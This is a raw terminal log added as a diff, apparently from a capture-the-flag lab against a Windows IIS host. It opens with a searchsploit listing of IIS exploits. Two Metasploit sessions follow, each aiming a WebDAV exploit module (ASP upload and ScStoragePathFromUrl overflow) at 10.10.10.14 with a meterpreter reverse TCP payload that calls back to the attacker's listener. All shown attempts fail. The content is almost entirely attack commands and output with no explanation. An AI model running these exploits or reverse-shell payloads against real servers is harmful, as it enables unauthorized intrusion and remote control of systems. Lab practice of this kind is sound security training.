@@ -1,1 +1,328 @@
 
+hippoeug@kali:~$ searchsploit iis
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ActivePerl 5.6.1 - 'perlIIS.dll' Remote Buffer Overflow (1)                                                                         | linux/remote/21152.c
+ActivePerl 5.6.1 - 'perlIIS.dll' Remote Buffer Overflow (2)                                                                         | windows/remote/21153.c
+ActivePerl 5.6.1 - 'perlIIS.dll' Remote Buffer Overflow (3)                                                                         | multiple/remote/21154.pl
+Apple WebObjects Developer NT4 IIS4.0 CGI-adapter 4.5 - Developer Remote Overflow                                                   | windows/dos/20379.txt
+Cisco Secure IDS 2.0/3.0 / Snort 1.x / ISS RealSecure 5/6 / NFR 5.0 - Encoded IIS Detection Evasion                                 | multiple/remote/21100.pl
+FrontPage 2000 / IIS 4.0/5.0 - Server Extensions Full Path Disclosure                                                               | windows/remote/19897.txt
+iisCart2000 - Arbitrary File Upload                                                                                                 | asp/webapps/22697.asp
+IISPop 1.161/1.181 - Remote Buffer Overflow (Denial of Service) (PoC)                                                               | windows/dos/22019.pl
+IISProtect 2.1/2.2 - Authentication Bypass                                                                                          | windows/remote/22631.txt
+IISProtect 2.1/2.2 - Web Administration Interface SQL Injection                                                                     | asp/webapps/22639.txt
+IISWorks ASPKnowledgeBase 2.0 - 'KB.asp' Cross-Site Scripting                                                                       | asp/webapps/26743.txt
+IISWorks FileMan - fileman.mdb Remote User Database Disclosure                                                                      | asp/webapps/13886.txt
+Microsoft Commercial Internet System 2.0/2.5 / IIS 4.0 / Site Server Commerce Edition 3.0 alpha/3.0 - Denial of Service             | multiple/dos/19457.txt
+Microsoft Data Access Components (MDAC) 2.1 / Microsoft IIS 3.0/4.0 / Microsoft Index Server 2.0 / Microsoft Site Server Commerce E | windows/local/19425.txt
+Microsoft Data Access Components (MDAC) 2.1 / Microsoft IIS 3.0/4.0 / Microsoft Index Server 2.0 / Microsoft Site Server Commerce E | windows/remote/19424.pl
+Microsoft Exchange - IIS HTTP Internal IP Address Disclosure (Metasploit)                                                           | windows/webapps/34817.rb
+Microsoft FrontPage 98 Server Extensions for IIS / Microsoft InterDev 1.0 - Filename Obfuscation                                    | windows/remote/19845.pl
+Microsoft FrontPage 98 Server Extensions for IIS / Microsoft InterDev 1.0 - Remote Buffer Overflow                                  | windows/remote/19846.pl
+Microsoft IIS (Windows NT 4.0/SP1/SP2/SP3/SP4/SP5) - '.IDC' Path Mapping                                                            | windows/remote/19239.txt
+Microsoft IIS - ASP Multiple Extensions Security Bypass 5.x/6.x Vulnerabilities                                                     | windows/remote/10791.py
+Microsoft IIS - ASP Stack Overflow (MS06-034)                                                                                       | windows/local/2056.c
+Microsoft IIS - HTTP Request Denial of Service                                                                                      | windows/dos/1396.cpp
+Microsoft IIS - HTTP Request Denial of Service (1)                                                                                  | windows/dos/1376.c
+Microsoft IIS - HTTP Request Denial of Service (2)                                                                                  | windows/dos/1377.pl
+Microsoft IIS - ISAPI 'nsiislog.dll' ISAPI POST Overflow (MS03-022) (Metasploit)                                                    | windows/remote/16355.rb
+Microsoft IIS - ISAPI 'w3who.dll' Query String Overflow (Metasploit)                                                                | windows/remote/16354.rb
+Microsoft IIS - ISAPI FrontPage 'fp30reg.dll' Chunked Overflow (MS03-051) (Metasploit)                                              | windows/remote/16356.rb
+Microsoft IIS - ISAPI RSA WebAgent Redirect Overflow (Metasploit)                                                                   | windows/remote/16358.rb
+Microsoft IIS - MDAC 'msadcs.dll' RDS DataStub Content-Type Overflow (MS02-065) (Metasploit)                                        | windows/remote/19026.rb
+Microsoft IIS - Phone Book Service Overflow (MS00-094) (Metasploit)                                                                 | windows/remote/16357.rb
+Microsoft IIS - SA WebAgent 5.2/5.3 Redirect Overflow (Metasploit)                                                                  | windows/remote/1260.pm
+Microsoft IIS - Short File/Folder Name Disclosure                                                                                   | windows/webapps/19525.txt
+Microsoft IIS - SSL Remote Denial of Service (MS04-011)                                                                             | windows/dos/176.c
+Microsoft IIS - WebDAV 'ntdll.dll' Remote Overflow                                                                                  | windows/remote/1.c
+Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overflow (Metasploit)                                                          | windows/remote/41992.rb
+Microsoft IIS - WebDAV Write Access Code Execution (Metasploit)                                                                     | windows/remote/16471.rb
+Microsoft IIS - WebDAV XML Denial of Service (MS04-030)                                                                             | windows/dos/585.pl
+Microsoft IIS 1.0 / Netscape Server 1.0/1.12 / OReilly WebSite Professional 1.1b - '.cmd' / '.CMD' Remote Command Execution         | windows/remote/20445.txt
+Microsoft IIS 2.0/3.0 - Appended Dot Script Source Disclosure                                                                       | windows/remote/20481.txt
+Microsoft IIS 2.0/3.0 - Long URL Denial of Service                                                                                  | windows/dos/20802.c
+Microsoft IIS 2.0/3.0/4.0 - ISAPI GetExtensionVersion()                                                                             | windows/local/19376.txt
+Microsoft IIS 2.0/3.0/4.0/5.0/5.1 - Internal IP Address Disclosure                                                                  | windows/remote/20096.txt
+Microsoft IIS 3.0 - 'newdsn.exe' File Creation                                                                                      | windows/remote/20309.txt
+Microsoft IIS 3.0/4.0 - Double Byte Code Page                                                                                       | windows/remote/19361.txt
+Microsoft IIS 3.0/4.0 - Upgrade BDIR.HTR                                                                                            | windows/remote/20590.txt
+Microsoft IIS 3.0/4.0 - Using ASP and FSO To Read Server Files                                                                      | multiple/remote/19194.txt
+Microsoft IIS 3.0/4.0 / Microsoft Index Server 2.0 - Directory Traversal (MS00-006)                                                 | multiple/remote/19742.txt
+Microsoft IIS 3.0/4.0 / Microsoft Personal Web Server 2.0/3.0/4.0 - ASP Alternate Data Streams                                      | multiple/remote/19118.txt
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (1)                                                   | windows/remote/20835.c
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (2)                                                   | windows/remote/20836.c
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (3)                                                   | windows/remote/20837.pl
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (4)                                                   | windows/remote/20838.c
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (5)                                                   | windows/remote/20839.sh
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (6)                                                   | windows/remote/20840.txt
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (7)                                                   | windows/remote/20841.txt
+Microsoft IIS 3.0/4.0/5.0 - PWS Escaped Characters Decoding Command Execution (8)                                                   | windows/remote/20842.txt
+Microsoft IIS 4 (Windows NT) - Log Avoidance                                                                                        | windows/remote/19149.c
+Microsoft IIS 4 (Windows NT) - Remote Web-Based Administration                                                                      | windows/remote/19147.txt
+Microsoft IIS 4.0 - '.htr' Path Overflow (MS02-018) (Metasploit)                                                                    | windows/remote/16468.rb
+Microsoft IIS 4.0 - ISAPI Buffer Overflow                                                                                           | windows/local/20383.txt
+Microsoft IIS 4.0 - Pickup Directory Denial of Service                                                                              | windows/dos/20310.txt
+Microsoft IIS 4.0 - Remote Buffer Overflow (1)                                                                                      | windows/remote/19245.pl
+Microsoft IIS 4.0 - Remote Buffer Overflow (2)                                                                                      | windows/remote/19246.pm
+Microsoft IIS 4.0 - Remote Buffer Overflow (3)                                                                                      | linux/remote/19247.c
+Microsoft IIS 4.0 - Remote Buffer Overflow (4)                                                                                      | windows/remote/19248.c
+Microsoft IIS 4.0 - UNC Mapped Virtual Host                                                                                         | multiple/remote/19824.txt
+Microsoft IIS 4.0 / Microsoft JET 3.5/3.5.1 Database Engine - VBA                                                                   | multiple/dos/19228.pl
+Microsoft IIS 4.0 / Microsoft Site Server 3.0 - Showcode ASP                                                                        | multiple/remote/19129.txt
+Microsoft IIS 4.0/5.0 - Chunked Encoding Transfer Heap Overflow (1)                                                                 | windows/remote/21368.c
+Microsoft IIS 4.0/5.0 - Chunked Encoding Transfer Heap Overflow (2)                                                                 | windows/remote/21369.c
+Microsoft IIS 4.0/5.0 - Chunked Encoding Transfer Heap Overflow (3)                                                                 | windows/remote/21370.c
+Microsoft IIS 4.0/5.0 - Chunked Encoding Transfer Heap Overflow (4)                                                                 | windows/remote/21371.c
+Microsoft IIS 4.0/5.0 - Device File Local Denial of Service                                                                         | windows/dos/20989.txt
+Microsoft IIS 4.0/5.0 - Device File Remote Denial of Service                                                                        | windows/dos/20991.txt
+Microsoft IIS 4.0/5.0 - Executable File Parsing                                                                                     | windows/remote/20384.txt
+Microsoft IIS 4.0/5.0 - FTP Denial of Service (MS01-026)                                                                            | windows/dos/20846.pl
+Microsoft IIS 4.0/5.0 - HTTP Error Page Cross-Site Scripting                                                                        | windows/remote/21372.txt
+Microsoft IIS 4.0/5.0 - Malformed File Extension Denial of Service                                                                  | windows/dos/19907.txt
+Microsoft IIS 4.0/5.0 - Malformed Filename Request                                                                                  | windows/remote/19908.txt
+Microsoft IIS 4.0/5.0 - SMTP Service Encapsulated SMTP Address (MS99-027)                                                           | windows/remote/21613.txt
+Microsoft IIS 4.0/5.0 - Source Fragment Disclosure                                                                                  | windows/remote/20089.txt
+Microsoft IIS 4.0/5.0 - SSI Buffer Overrun Privilege Escalation                                                                     | windows/local/21071.c
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (1)                                                            | windows/remote/20298.c
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (2)                                                            | windows/remote/20299.pl
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (3)                                                            | windows/remote/20300.c
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (4)                                                            | windows/remote/20301.php
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (5)                                                            | windows/remote/20302.pl
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (6)                                                            | windows/remote/189.c
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (7)                                                            | windows/remote/191.pl
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (8)                                                            | windows/remote/192.pl
+Microsoft IIS 4.0/5.0 and PWS - Extended Unicode Directory Traversal (9)                                                            | windows/remote/190.c
+Microsoft IIS 4.0/5.0/5.1 - Authentication Method Disclosure                                                                        | windows/remote/21313.txt
+Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                    | windows/remote/21057.txt
+Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (1)                                          | windows/remote/22365.pl
+Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (2)                                          | windows/remote/22366.c
+Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (3)                                          | windows/remote/22367.txt
+Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (4)                                          | windows/remote/22368.txt
+Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (1)                                                                  | windows/remote/20815.pl
+Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (2)                                                                  | windows/remote/20816.c
+Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (3)                                                                  | windows/remote/20817.c
+Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (4)                                                                  | windows/remote/20818.txt
+Microsoft IIS 5.0 - '500-100.asp' Server Name Spoof                                                                                 | windows/remote/1178.c
+Microsoft IIS 5.0 - 'CodeBrws.asp' Source Code Disclosure                                                                           | windows/remote/21385.txt
+Microsoft IIS 5.0 - 'Translate: f' Source Disclosure (1)                                                                            | windows/remote/20151.pl
+Microsoft IIS 5.0 - 'Translate: f' Source Disclosure (2)                                                                            | windows/remote/20152.pl
+Microsoft IIS 5.0 - Authentication Bypass (MS10-065)                                                                                | windows/remote/14179.txt
+Microsoft IIS 5.0 - Failure To Log Undocumented TRACK Requests                                                                      | windows/remote/23490.txt
+Microsoft IIS 5.0 - False Content-Length Field Denial of Service                                                                    | windows/dos/21177.txt
+Microsoft IIS 5.0 - IDC Extension Cross-Site Scripting                                                                              | windows/remote/21910.txt
+Microsoft IIS 5.0 - IDQ Path Overflow (MS01-033) (Metasploit)                                                                       | windows/remote/16472.rb
+Microsoft IIS 5.0 - IISAPI Extension Enumerate Root Web Server Directory                                                            | windows/remote/19152.txt
+Microsoft IIS 5.0 - In-Process Table Privilege Escalation                                                                           | windows/local/21072.txt
+Microsoft IIS 5.0 - Indexed Directory Disclosure                                                                                    | windows/remote/20269.txt
+Microsoft IIS 5.0 - Printer Host Header Overflow (MS01-023) (Metasploit)                                                            | windows/remote/16469.rb
+Microsoft IIS 5.0 - SSL Remote Buffer Overflow (MS04-011)                                                                           | windows/remote/275.c
+Microsoft IIS 5.0 - User Existence Disclosure (1)                                                                                   | windows/remote/22562.pl
+Microsoft IIS 5.0 - User Existence Disclosure (2)                                                                                   | windows/remote/22563.pl
+Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03-007) (Metasploit)                                                        | windows/remote/16470.rb
+Microsoft IIS 5.0 - WebDAV Denial of Service                                                                                        | windows/dos/20664.pl
+Microsoft IIS 5.0 - WebDAV Lock Method Memory Leak Denial of Service                                                                | windows/dos/20854.txt
+Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service                                                               | windows/dos/22670.c
+Microsoft IIS 5.0 - WebDAV Remote                                                                                                   | windows/remote/2.c
+Microsoft IIS 5.0 - WebDAV Remote Code Execution (3) (xwdav)                                                                        | windows/remote/51.c
+Microsoft IIS 5.0 < 5.1 - Remote Denial of Service                                                                                  | windows/dos/35.c
+Microsoft IIS 5.0 FTP Server (Windows 2000 SP4) - Remote Stack Overflow                                                             | windows/remote/9559.pl
+Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                             | windows/remote/9541.pl
+Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                               | windows/dos/9587.txt
+Microsoft IIS 5.1 - Hit Highlighting Authentication Bypass                                                                          | windows/remote/4016.sh
+Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure                                                                      | windows/remote/26230.txt
+Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                        | windows/dos/3965.pl
+Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                              | windows/dos/15167.txt
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                            | windows/remote/41738.py
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                         | windows/remote/8704.txt
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                         | windows/remote/8806.pl
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                     | windows/remote/8754.patch
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                       | windows/remote/8765.php
+Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                            | windows/remote/19033.txt
+Microsoft IIS 7.0 FTP Server - Stack Exhaustion Denial of Service (MS09-053) (Metasploit)                                           | windows/dos/17476.rb
+Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC)                                                  | windows/dos/15803.py
+Microsoft IIS FTP Server - NLST Response Overflow (MS09-053) (Metasploit)                                                           | windows/remote/16740.rb
+Microsoft IIS/PWS - CGI Filename Double Decode Command Execution (MS01-026) (Metasploit)                                            | windows/remote/16467.rb
+Microsoft Internet Explorer 8/9/10/11 / IIS / CScript.exe/WScript.exe VBScript - CRegExp..Execute Use of Uninitialized Memory (MS14 | windows/remote/40721.html
+Microsoft Site Server 2.0 with IIS 4.0 - Arbitrary File Upload                                                                      | windows/remote/20305.txt
+Microsoft Windows Media Services - 'nsiislog.dll' Remote Overflow                                                                   | windows/remote/56.c
+Microsoft Windows NT 4.0/2000 - Media Services 'nsiislog.dll' Remote Buffer Overflow                                                | windows/remote/22837.c
+NOKIA Siemens FlexiISN 3.1 - Multiple Authentication Bypass Vulnerabilities                                                         | hardware/remote/8316.txt
+Oracle WebLogic IIS connector JSESSIONID - Remote Overflow                                                                          | windows/remote/8336.pl
+PHP 5.2.0 (Windows x86) - 'PHP_iisfunc.dll' Local Buffer Overflow                                                                   | windows_x86/dos/4318.php
+RSA WebID 5.3 - 'IISWebAgentIF.dll' Cross-Site Scripting                                                                            | cgi/webapps/31411.txt
+RTK IIS Codec Service 6.4.10041.133 - 'RtkI2SCodec' Unquote Service Path                                                            | windows/local/47642.txt
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+hippoeug@kali:~$ 
+
+
+
+
+
+
+==================
+
+
+
+
+
+
+msf5 > use exploit/windows/iis/iis_webdav_upload_asp
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > show options
+
+Module options (exploit/windows/iis/iis_webdav_upload_asp):
+
+   Name          Current Setting        Required  Description
+   ----          ---------------        --------  -----------
+   HttpPassword                         no        The HTTP password to specify for authentication
+   HttpUsername                         no        The HTTP username to specify for authentication
+   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
+   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT         80                     yes       The target port (TCP)
+   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
+   VHOST                                no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > set rhost 10.10.10.14
+rhost => 10.10.10.14
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Checking /metasploit179460229.asp
+[*] Uploading 614165 bytes to /metasploit179460229.txt...
+[-] Upload failed on /metasploit179460229.txt [500 Internal Server Error]
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > show options
+
+Module options (exploit/windows/iis/iis_webdav_upload_asp):
+
+   Name          Current Setting        Required  Description
+   ----          ---------------        --------  -----------
+   HttpPassword                         no        The HTTP password to specify for authentication
+   HttpUsername                         no        The HTTP username to specify for authentication
+   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
+   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
+   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        10.10.10.14            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT         80                     yes       The target port (TCP)
+   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
+   VHOST                                no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > set method copy
+method => copy
+msf5 exploit(windows/iis/iis_webdav_upload_asp) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Checking /metasploit198271057.asp
+[*] Uploading 613534 bytes to /metasploit198271057.txt...
+[-] Upload failed on /metasploit198271057.txt [500 Internal Server Error]
+[*] Exploit completed, but no session was created.
+
+
+
+=================
+
+
+
+msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhost 10.10.10.14
+rhost => 10.10.10.14
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Trying path length 3 to 60 ...
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > 
